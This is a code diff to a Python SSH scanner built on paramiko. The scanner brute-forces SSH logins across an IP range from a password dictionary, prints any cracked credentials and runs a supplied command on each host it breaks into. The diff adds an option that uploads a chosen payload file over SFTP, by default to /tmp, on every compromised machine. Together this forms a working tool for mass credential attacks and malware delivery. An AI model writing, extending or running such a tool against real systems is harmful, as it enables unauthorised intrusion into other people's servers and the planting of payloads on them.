@@ -40,7 +40,10 @@ class SSHScan():
                  ssh_port,
                  max_thread,
                  timeout,
-                 command
+                 command,
+                 payload_file,
+                 upload_dir
+
                  ):
 
         
@@ -57,6 +60,8 @@ class SSHScan():
         self.timeout = timeout 
         self.forced_exit = False
         self.thread_list = {}
+        self.payload_file = payload_file
+        self.upload_dir = upload_dir
     
 
     def _remove_ip(self, ip):
@@ -171,6 +176,13 @@ class SSHScan():
                     ssh.connect(ip, self.ssh_port, user, psw,timeout=self.timeout)
                     print(green_text+"[*] Password found ({}/{}) on {}:{}".format(user,psw, ip, self.ssh_port)+reset_text)
 
+
+                    if self.payload_file is not None:
+                        print("Uploading payload {} to {}...".format(self.payload_file, self.upload_dir))
+                        sftp = ssh.open_sftp()
+                        sftp.put(self.payload_file, self.upload_dir)
+                        sftp.close()
+
                     if self.ssh_linux_shellcode is not None:
                         print("Sending command: {}".format(self.ssh_linux_shellcode)) 
                         stdin, stdout, stderr = ssh.exec_command(self.ssh_linux_shellcode)
@@ -186,7 +198,9 @@ class SSHScan():
                         for line in output:
                             ww.write(line)
                         ww.close()
-                    
+                        
+
+
                 except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.SSHException):
                     ssh.close()
                     ###### remove ip if FIRST CRACKED option is enabled
@@ -206,7 +220,9 @@ def scan(start_ip,
         port=22, 
         max_thread=10, 
         timeout=3, 
-        command=None):
+        command=None,
+        payload_file=None,
+        upload_dir="/tmp"):
 
     global ssh_scan 
     ssh_scan = SSHScan(start_ip,
@@ -217,7 +233,10 @@ def scan(start_ip,
                        port,
                        max_thread,
                        timeout,
-                       command)
+                       command,
+                        payload_file,
+                        upload_dir
+                       )
 
 
     ssh_scan._loadDictionary()
